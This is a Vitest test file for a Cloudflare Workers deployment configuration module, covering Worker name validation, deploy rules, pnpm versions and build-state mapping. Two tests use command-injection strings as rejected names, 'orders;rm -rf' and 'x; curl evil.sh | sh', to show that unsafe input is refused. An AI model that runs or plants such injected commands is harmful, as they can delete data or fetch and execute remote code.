import { describe, expect, it } from "vitest";
import {
  buildCloudflareTokenTemplateUrl,
  buildDeployRule,
  isBuildTokenRevokedLog,
  isDeploymentInProgress,
  isValidWorkerName,
  pnpmVersionForBuild,
  suggestWorkerName,
  toDeploymentState,
  type DeployRuleInput,
} from "./build_config";

describe("buildCloudflareTokenTemplateUrl", () => {
  it("opens the user token form with the permissions both jobs need", () => {
    const url = new URL(buildCloudflareTokenTemplateUrl());
    // Account-owned tokens are rejected by the builds API, so it has to be the
    // profile page.
    expect(url.origin + url.pathname).toBe(
      "https://dash.cloudflare.com/profile/api-tokens",
    );
    const permissions = JSON.parse(
      url.searchParams.get("permissionGroupKeys")!,
    ) as { key: string; type: string }[];
    expect(permissions).toContainEqual({
      key: "workers_scripts",
      type: "edit",
    });
    expect(permissions).toContainEqual({ key: "workers_ci", type: "edit" });
    expect(permissions).toContainEqual({
      key: "account_settings",
      type: "read",
    });
    expect(url.searchParams.get("accountId")).toBe("*");
    expect(url.searchParams.get("zoneId")).toBe("all");
    expect(url.searchParams.get("name")).toBe("Dyad");
  });
});

describe("Worker names", () => {
  it("accepts what Cloudflare accepts and rejects the rest", () => {
    expect(isValidWorkerName("orders-api")).toBe(true);
    expect(isValidWorkerName("a")).toBe(true);
    expect(isValidWorkerName("a".repeat(63))).toBe(true);
    expect(isValidWorkerName("a".repeat(64))).toBe(false);
    expect(isValidWorkerName("Orders")).toBe(false);
    expect(isValidWorkerName("-orders")).toBe(false);
    expect(isValidWorkerName("orders-")).toBe(false);
    expect(isValidWorkerName("orders api")).toBe(false);
    expect(isValidWorkerName("orders;rm -rf")).toBe(false);
    expect(isValidWorkerName("")).toBe(false);
  });

  it("prefers the name the Wrangler config already declares", () => {
    expect(
      suggestWorkerName({
        configName: "orders-api",
        appName: "My Shop",
        rootDirectory: "worker",
      }),
    ).toBe("orders-api");
  });

  it("builds a name from the app and folder when the config has none", () => {
    expect(
      suggestWorkerName({
        configName: null,
        appName: "My Shop",
        rootDirectory: "services/api",
      }),
    ).toBe("my-shop-api");
    expect(
      suggestWorkerName({
        configName: null,
        appName: "My Shop",
        rootDirectory: "",
      }),
    ).toBe("my-shop");
  });

  it("does not suggest a config name Cloudflare would refuse", () => {
    const name = suggestWorkerName({
      configName: "Not Valid!",
      appName: "My Shop",
      rootDirectory: "",
    });
    expect(name).toBe("my-shop");
    expect(isValidWorkerName(name)).toBe(true);
  });
});

describe("buildDeployRule", () => {
  const base: DeployRuleInput = {
    workerTag: "tag-1",
    workerName: "orders-api",
    repoConnectionUuid: "conn-1",
    buildTokenUuid: "token-1",
    rootDirectory: "",
    branch: "main",
    hasBuildScript: true,
  };

  it("deploys the root on any change to the branch", () => {
    expect(buildDeployRule(base)).toEqual({
      external_script_id: "tag-1",
      repo_connection_uuid: "conn-1",
      build_token_uuid: "token-1",
      trigger_name: "Deploy from Dyad",
      build_command: "npm run build",
      deploy_command: "npx wrangler deploy --name orders-api",
      root_directory: "/",
      branch_includes: ["main"],
      branch_excludes: [],
      path_includes: ["*"],
      path_excludes: [],
    });
  });

  it("runs in a subfolder and only rebuilds for changes inside it", () => {
    const rule = buildDeployRule({ ...base, rootDirectory: "services/api" });
    expect(rule.root_directory).toBe("/services/api");
    expect(rule.path_includes).toEqual(["services/api/*"]);
  });

  it("leaves the build step empty when the folder has no build script", () => {
    expect(
      buildDeployRule({ ...base, hasBuildScript: false }).build_command,
    ).toBe("");
  });

  it("follows the branch the app syncs to", () => {
    expect(
      buildDeployRule({ ...base, branch: "release" }).branch_includes,
    ).toEqual(["release"]);
  });

  it("refuses a name that would not be safe inside the deploy command", () => {
    expect(() =>
      buildDeployRule({ ...base, workerName: "x; curl evil.sh | sh" }),
    ).toThrow(/Invalid Worker name/);
  });
});

describe("pnpmVersionForBuild", () => {
  const base = {
    packageManagerField: null,
    localPnpmVersion: "11.4.2",
  };

  it("uses the pnpm on this machine when the project pins nothing", () => {
    expect(pnpmVersionForBuild(base)).toBe("11.4.2");
  });

  it("uses the project's pin, without its integrity hash", () => {
    expect(
      pnpmVersionForBuild({
        ...base,
        packageManagerField: "pnpm@10.30.1+sha512.abc",
      }),
    ).toBe("10.30.1");
  });

  it("ignores a pin for a different package manager", () => {
    expect(
      pnpmVersionForBuild({ ...base, packageManagerField: "yarn@4.9.1" }),
    ).toBe("11.4.2");
  });

  it("says nothing rather than send Cloudflare something that is not a version", () => {
    expect(pnpmVersionForBuild({ ...base, localPnpmVersion: null })).toBeNull();
    expect(
      pnpmVersionForBuild({ ...base, localPnpmVersion: "command not found" }),
    ).toBeNull();
  });
});

describe("deployment state", () => {
  it("collapses Cloudflare's status and outcome", () => {
    expect(toDeploymentState({ status: "queued" })).toBe("queued");
    expect(toDeploymentState({ status: "initializing" })).toBe("building");
    expect(toDeploymentState({ status: "running" })).toBe("building");
    expect(
      toDeploymentState({ status: "stopped", build_outcome: "success" }),
    ).toBe("live");
    expect(
      toDeploymentState({ status: "stopped", build_outcome: "fail" }),
    ).toBe("failed");
    expect(
      toDeploymentState({ status: "stopped", build_outcome: "cancelled" }),
    ).toBe("cancelled");
    expect(
      toDeploymentState({ status: "stopped", build_outcome: "canceled" }),
    ).toBe("cancelled");
    // A stopped build with no recorded outcome did not succeed.
    expect(toDeploymentState({ status: "stopped" })).toBe("failed");
    expect(toDeploymentState({})).toBe("none");
  });

  it("knows which states are still moving", () => {
    expect(isDeploymentInProgress("queued")).toBe(true);
    expect(isDeploymentInProgress("building")).toBe(true);
    expect(isDeploymentInProgress("live")).toBe(false);
    expect(isDeploymentInProgress("failed")).toBe(false);
  });

  it("recognises the failure a deleted or rolled token causes", () => {
    expect(
      isBuildTokenRevokedLog([
        "Initializing build environment...",
        "Failed: The build token selected for this build has been deleted or rolled and cannot be used for this build.",
      ]),
    ).toBe(true);
    expect(
      isBuildTokenRevokedLog(["npm error Could not resolve dependency"]),
    ).toBe(false);
  });
});
